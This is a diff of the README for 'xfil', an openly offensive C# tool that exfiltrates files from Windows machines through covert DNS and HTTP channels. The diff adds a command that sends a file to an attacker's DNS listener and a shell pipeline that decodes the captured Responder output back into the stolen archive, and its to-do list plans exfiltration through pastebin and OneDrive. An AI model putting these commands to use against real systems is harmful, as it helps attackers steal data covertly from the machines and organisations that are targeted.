@@ -6,7 +6,7 @@ Simple C# program to exfiltrate data/files through covert channels from windows 
 * If you are targeting Windows 10 use *.NET Framework 4.0* when compiling. 
 * To use the .exe you need the Ionic.zip.dll too, you can use BoxedAPP to merge them into a standalone .exe ( the release .exe is already merged with this .dll)
 ## Compiled binaries
-Check the releases.
+Check the releases. Only version 0.1 available.
 
 
 ## Receive data
@@ -34,11 +34,13 @@ xfil.exe /dns listener_ip  file.zip.b64
 
 ```bash
 # After getting the xfil save all of the responder output and then parse it to the final exfiltrated file
-cat responder_out.txt | awk -F" " '{print $10}' | awk -F"." '{print $2}' | tr -d '\n' | xxd -r -p | base64 -d >> secret.zip
+cat /tmp/respon.dat | awk -F" " '{print $10}' | awk -F"." '{print $2}' | tr -d '\n' >> /tmp/respon2.dat
+sed -e 's/SLASH/\//g' -e 's/PLUS/\+/g' -e 's/EQUAL/\=/g' /tmp/respon2.dat | base64 -d >> secret.zip
 ```
 
 ### TO-DO
-* Replace base64+hex  with someething more efficient (base32)
+* Add xfil through pastebin/onedrive
+* Replace base64+hex  with something more efficient ~~(base32)~~ **[ DONE ]**
 * Add DNS exfil **[ DONE ]**
 * Add HTTP exfil **[ DONE ]**
 * Add base64 encoding **[ DONE ]**
